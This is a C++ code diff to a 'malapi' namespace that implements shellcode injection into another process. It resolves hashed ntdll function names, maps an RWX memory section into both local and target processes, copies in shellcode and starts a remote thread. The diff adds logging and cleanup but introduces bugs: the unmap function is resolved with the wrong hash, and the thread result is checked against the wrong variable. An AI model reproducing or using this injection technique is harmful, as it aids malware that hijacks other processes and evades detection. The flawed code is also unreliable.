@@ -769,6 +769,7 @@ namespace malapi
 		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
 		constexpr DWORD hash_ntcreatesection = HashStringFowlerNollVoVariant1a("NtCreateSection");
 		constexpr DWORD hash_ntmapviewofsection = HashStringFowlerNollVoVariant1a("NtMapViewOfSection");
+		constexpr DWORD hash_ntunmapviewofsection = HashStringFowlerNollVoVariant1a("NtUnmapViewOfSection");
 		constexpr DWORD hash_rtlcreateuserthread = HashStringFowlerNollVoVariant1a("RtlCreateUserThread");
 
 		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
@@ -776,6 +777,7 @@ namespace malapi
 
 		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddressC(ntdll, hash_ntcreatesection);
 		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
+		typeNtUnmapViewOfSection NtUnmapViewOfSection = (typeNtUnmapViewOfSection)GetProcAddressC(ntdll, hash_ntmapviewofsection);
 		typeRtlCreateUserThread RtlCreateUserThread = (typeRtlCreateUserThread)GetProcAddressC(ntdll, hash_rtlcreateuserthread);
 		typeNtClose NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);
 		if (!NtCreateSection || !NtMapViewOfSection || !RtlCreateUserThread || !NtCloseC) return FALSE;
@@ -792,7 +794,7 @@ namespace malapi
 			NULL,
 			&section_size,
 			PAGE_EXECUTE_READWRITE,
-			SEC_COMMIT, // Unsure if SEC_RESERVE is needed here.
+			SEC_COMMIT,
 			NULL
 		);
 
@@ -801,6 +803,7 @@ namespace malapi
 			LOG_ERROR("Failed to create memory section. (Code: %08llX)", status);
 			goto CLEANUP;
 		}
+		LOG_SUCCESS("Memory Section Created");
 
 		// Map the section to local process (RW)
 		status = NtMapViewOfSection(
@@ -821,6 +824,7 @@ namespace malapi
 			LOG_ERROR("Failed to map section to local process. (Code: %08llX)", status);
 			goto CLEANUP;
 		}
+		LOG_SUCCESS("Memory Section Mapped to Local Process");
 
 		// Map the section to target process (RX)
 		status = NtMapViewOfSection(
@@ -840,12 +844,13 @@ namespace malapi
 			LOG_ERROR("Failed to map section to target. (Code: %08llX)", status);
 			goto CLEANUP;
 		}
+		LOG_SUCCESS("Memory Section Mapped to Target");
 
 		// Copy shellcode to mapped view.
 		memcpy(addr_local_section, shellcode, shellcode_size);
 
 		// Create thread.
-		if (!NT_SUCCESS(RtlCreateUserThread(
+		success = RtlCreateUserThread(
 			process_handle,
 			NULL,
 			FALSE,
@@ -856,14 +861,20 @@ namespace malapi
 			NULL,
 			&target_thread,
 			NULL
-		))) goto CLEANUP;
+		);
+
+		if (!NT_SUCCESS(status))
+		{
+			LOG_ERROR("Failed to create thread. (Code: %08llX)", status);
+			goto CLEANUP;
+		}
+		LOG_SUCCESS("Thread Created");
 
 		success = TRUE;
 	CLEANUP:
-		if (!success)
-		{
-			NtCloseC(process_handle);
-		}
+		NtCloseC(additional_handle);
+		NtCloseC(process_handle);
+		NtUnmapViewOfSection(process_handle, addr_local_section);
 		return success;
 	}
 
